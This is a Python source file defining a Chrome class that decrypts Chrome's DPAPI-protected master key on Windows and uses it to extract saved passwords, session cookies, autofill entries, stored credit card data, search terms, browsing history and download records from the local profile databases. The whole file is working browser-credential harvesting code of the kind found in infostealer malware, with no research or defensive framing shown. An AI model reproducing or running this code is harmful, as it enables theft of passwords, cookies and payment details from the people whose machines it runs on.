import os
import json
import shutil
import base64
import sqlite3
from zipfile import ZipFile
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
from datetime import datetime, timezone, timedelta


class Chrome:
    def __init__(self):
        self._user_data = os.getenv(
            "LOCALAPPDATA") + "\\Google\\Chrome\\User Data"
        self._master_key = self._get_master_key()
        
    def get_installed_browsers(self):
        default_dir_paths = ["C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
                             "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"]
        for path in default_dir_paths:
            if os.path.exists(path):
                return True
        return False
    
    def _get_master_key(self):
        try:
            if self.get_installed_browsers():
                with open(self._user_data + "\\Local State", "r") as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
                    master_key = base64.b64decode(
                        local_state["os_crypt"]["encrypted_key"])
                    master_key = master_key[5:]
                    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
                    return master_key
            else: 
                return None
        except Exception as e:
            return e

    def chrome_date_and_time(self,chrome_data):
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

    @staticmethod
    def _decrypt(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception as e:
            return str(e)

    @staticmethod
    def _convert_time(time):
        epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
        code_stamp = epoch + timedelta(microseconds=time)
        return code_stamp.strftime('%Y/%m/%d - %H:%M:%S')
    
    def convert_size(self,size_bytes):
        suffixes = ['B', 'KB', 'MB', 'GB']
        suffix_index = 0
        size = float(size_bytes)
        while size >= 1024 and suffix_index < len(suffixes) - 1:
            size /= 1024
            suffix_index += 1
        return f"{size:.2f} {suffixes[suffix_index]}"
    
    def passwords(self):
        try:
            login_db = self._user_data + "\\Default\\Login Data"
            login_db_copy = os.getenv("TEMP") + "\\Login.db"
            shutil.copy2(login_db, login_db_copy)
            conn = sqlite3.connect(login_db_copy)
            cursor = conn.cursor()
            password_data = ""
            try:
                cursor.execute(
                    "SELECT action_url, username_value, password_value, date_created, date_last_used FROM logins order by date_created desc")
                for item in cursor.fetchall():
                    url = item[0]
                    username = item[1]
                    encrypted_password = item[2]
                    decrypted_password = self._decrypt(
                        encrypted_password, self._master_key)
                    date_of_creation = item[3]
                    last_usuage = item[4]
                    if username or decrypted_password:
                        data = f"URLs: {url}\n"
                        data += f"Username: {username}\n"
                        data += f"Password: {decrypted_password}\n"
                        
                    else:
                        continue
                    
                    if date_of_creation != 86400000000 and date_of_creation:
                        data += f"Creation date: {str(self.chrome_date_and_time(date_of_creation))}\n"
                    
                    if last_usuage != 86400000000 and last_usuage:
                        data +=f"Last Used: {str(self.chrome_date_and_time(last_usuage))} --\n\n"
                    password_data += data
            except sqlite3.Error:
                pass
            cursor.close()
            conn.close()
            os.remove(login_db_copy)
            return password_data
        except Exception as e:
            return f"[!]Error: {e}"
            
    def chrome_passwords_to_excel(self):
        try:
            login_db = self._user_data + "\\Default\\Login Data"
            login_db_copy = os.getenv("TEMP") + "\\Login.db"
            shutil.copy2(login_db, login_db_copy)
            conn = sqlite3.connect(login_db_copy)
            cursor = conn.cursor()
            password_data = []
            try:
                cursor.execute(
                    "SELECT action_url, username_value, password_value, date_created, date_last_used FROM logins order by date_created desc")
                for item in cursor.fetchall():
                    url = item[0]
                    username = item[1]
                    encrypted_password = item[2]
                    decrypted_password = self._decrypt(
                        encrypted_password, self._master_key)
                    date_of_creation = item[3]
                    last_usuage = item[4]
                    if username or decrypted_password:
                        data = [url, username, decrypted_password]
                    else:
                        continue
                    if date_of_creation != 86400000000 and date_of_creation:
                        data.append(str(self.chrome_date_and_time(date_of_creation)))
                    else:
                        data.append("")
                    if last_usuage != 86400000000 and last_usuage:
                        data.append(str(self.chrome_date_and_time(last_usuage)))
                    else:
                        data.append("")
                    password_data.append(data)
            except sqlite3.Error:
                pass
            cursor.close()
            conn.close()
            os.remove(login_db_copy)
            return password_data
        except Exception as e:
            return f"[!]Error: {e}"
   
    def cookies(self):
        try:
            if self.get_installed_browsers():
                cookies_db = self._user_data + "\\Default\\Network\\cookies"
                cookies_db_copy = os.getenv("TEMP") + "\\Cookies.db"
                shutil.copy2(cookies_db, cookies_db_copy)
                conn = sqlite3.connect(cookies_db_copy)
                cursor = conn.cursor()
                cookies = ""
                
                cursor.execute(
                    "SELECT host_key, name, encrypted_value, creation_utc, expires_utc, is_secure, last_access_utc, has_expires, source_port,last_update_utc from cookies")
                for item in cursor.fetchall():
                    host = item[0]
                    user = item[1]
                    decrypted_cookie = self._decrypt(item[2], self._master_key)
                    creation= item[3]
                    expires= item[4]
                    is_secures= item[5]
                    last_access= item[6]
                    has_expires= item[7]
                    sourc_port= item[8]
                    last_update= item[9]
                    cookie_data = "Cookies data\n"
                    cookie_data += f"Host key: {host}\n"
                    cookie_data += f"Name: {user}\n"
                    cookie_data += f"Value decrypt: {decrypted_cookie}\n"
                    cookie_data += f"Date creation: {self.chrome_date_and_time(creation)}\n"
                    cookie_data += f"Expire date: {self.chrome_date_and_time(expires)}\n"
                    if is_secures==1:
                        cookie_data += f"Cookies is Secured: Yes \n"
                    else:
                        cookie_data += f"Cookies is Secured: No \n"
                    cookie_data += f"Last Access date: {self.chrome_date_and_time(last_access)}\n"
                    if has_expires==1:
                        cookie_data += f"Cookies has been Expired: Yes\n"
                    else:
                        cookie_data += f"Cookies has been Expired: No\n"
                    cookie_data += f"Source Port: {sourc_port}\n"
                    cookie_data += f"Last update date: {self.chrome_date_and_time(last_update)}\n\n"
                    cookies += cookie_data
                
                cursor.close()
                conn.close()
                os.remove(cookies_db_copy)
                return cookies
            return "Chrome browsers is not installed!!!!!"
        except Exception as e:
            return e

    def web_data(self):
        try:
            if self.get_installed_browsers():
                web_data_db = self._user_data + "\\Default\\Web Data"
                web_data_db_copy = os.getenv("TEMP") + "\\Web.db"
                shutil.copy2(web_data_db, web_data_db_copy)
                conn = sqlite3.connect(web_data_db_copy)
                cursor = conn.cursor()
                autofill_data = ""
                cursor.execute("SELECT name, value, value_lower, date_created, date_last_used FROM autofill")
                for item in cursor.fetchall():
                    name = item[0]
                    value = item[1]
                    value_lower = item[2]
                    date_created = item[3]
                    date_last_used = item[4]
                    message = "="*10+"Autofill data"+"="*10 + "\n"
                    message += f"Data name: {name}\n"
                    message += f"Data value: {value}\n"
                    message += f"Data value lower: {value_lower}\n"
                    message += f"Creation date: {self.chrome_date_and_time(date_created)}\n"
                    message += f"Last Used date: {self.chrome_date_and_time(date_last_used)}\n\n"
                    autofill_data += message
                    # autofill_data.append((name, message += f"Data:{name}\n"))
                cursor.close()
                conn.close()
                os.remove(web_data_db_copy)
                return autofill_data
            return "Chrome browsers is not installed!!!!!"
        except Exception as e:
            return e
        
    def credit_card_chrome(self):
        try:
            if self.get_installed_browsers():
                web_data_db = self._user_data + "\\Default\\Web Data"
                web_data_db_copy = os.getenv("TEMP") + "\\Web.db"
                shutil.copy2(web_data_db, web_data_db_copy)
                conn = sqlite3.connect(web_data_db_copy)
                cursor = conn.cursor()
                credit_card_info = []
                cursor.execute("SELECT * FROM credit_cards")
                for item in cursor.fetchall():
                    username = item[1]
                    encrypted_password = item[4]
                    decrypted_password = self._decrypt(
                        encrypted_password, self._master_key)
                    expire_mon = item[2]
                    expire_year = item[3]
                    message = "Credit card info\n"
                    message += f"Username: {username}\n"
                    message += f"Password: {decrypted_password}\n"
                    message += f"Expired month: {expire_mon}\n"
                    message += f"Expired year: {expire_year}\n\n"
                    credit_card_info += message
                    # credit_card_info.append((username, decrypted_password, expire_mon, expire_year))
            
                cursor.close()
                conn.close()
                os.remove(web_data_db_copy)
                return credit_card_info
            return "Chrome browsers is not installed!!!!!"
        except Exception as e:
            return e

      
    def search_terms(self):
        search_terms = ""
        try:
            if self.get_installed_browsers():
                history_db = self._user_data + "\\Default\\History"
                history_db_copy = os.getenv("TEMP") + "\\History.db"
                shutil.copy2(history_db, history_db_copy)
                conn = sqlite3.connect(history_db_copy)
                cursor = conn.cursor()
                
                cursor.execute('SELECT term FROM keyword_search_terms')
                detail = cursor.fetchall()
                for term in detail:
                    terms =term[0]
                    message = f"{terms}\n"
                    search_terms += message
                    
                # search_terms = [item[0] for item in cursor.fetchall()]

                cursor.close()
                conn.close()
                os.remove(history_db_copy)
                return search_terms
            return "Chrome browsers is not installed!!!!!"
        except Exception as e:
            return e
        
    def history(self):
        web_history = ""
        try:
            if self.get_installed_browsers():
                history_db = self._user_data + "\\Default\\History"
                history_db_copy = os.getenv("TEMP") + "\\History.db"
                shutil.copy2(history_db, history_db_copy)
                conn = sqlite3.connect(history_db_copy)
                cursor = conn.cursor()
                cursor.execute('SELECT title, url, last_visit_time FROM urls order by last_visit_time desc')
                for item in cursor.fetchall():
                    title = item[0]
                    url = item[1]
                    last_time = self._convert_time(item[2])
                    message = f"Title: {title}\n"
                    message += f"URL: {url}\n"
                    message += f"Last Time Visit: {last_time}\n\n"
                    web_history += message
                    # web_history.append({'Title': title, 'Url': url, 'Last Time Visit': last_time})
                cursor.close()
                conn.close()
                os.remove(history_db_copy)
                return web_history
            return "Chrome browsers is not installed!!!!!"
        except Exception as e:
            return e
    
    def get_chrome_downloads(self):
        try:
            history_db = self._user_data + "\\Default\\History"
            history_db_copy = os.getenv("TEMP") + "\\History.db"
            shutil.copy2(history_db, history_db_copy)
            conn = sqlite3.connect(history_db_copy)
            c = conn.cursor()
            c.execute("SELECT tab_url, tab_referrer_url , referrer, current_path,target_path, start_time, end_time, received_bytes,total_bytes, last_modified , last_access_time,mime_type FROM downloads order by end_time desc")
            downloads = c.fetchall()
            result = ""
            for download in downloads:
                resul = f"Urls: {download[0]}\n"
                resul += f"Referrer Urls: {download[1]}\n"
                resul += f"Referrer: {download[2]}\n"
                resul += f"Current Path: {download[3]}\n"
                resul += f"Target Path: {download[4]}\n"
                resul += f"Start Time: {self._convert_time(download[5])}\n"
                resul += f"End Time: {self._convert_time(download[6])}\n"
                resul += f"Received Bytes: {self.convert_size(download[7])}\n"
                resul += f"Total Bytes: {self.convert_size(download[7])}\n"
                resul += f"Last modified: {download[9]}\n"
                resul += f"Last Access Time: {self._convert_time(download[10])}\n"
                resul += f"Mime Type: {download[11]}\n\n"
                result +=resul
            c.close()
            conn.close()
            os.remove(history_db_copy)
            conn.close()

            return result 
        except Exception as e:
            return e
browser = Chrome()

# print(browser.passwords())
    
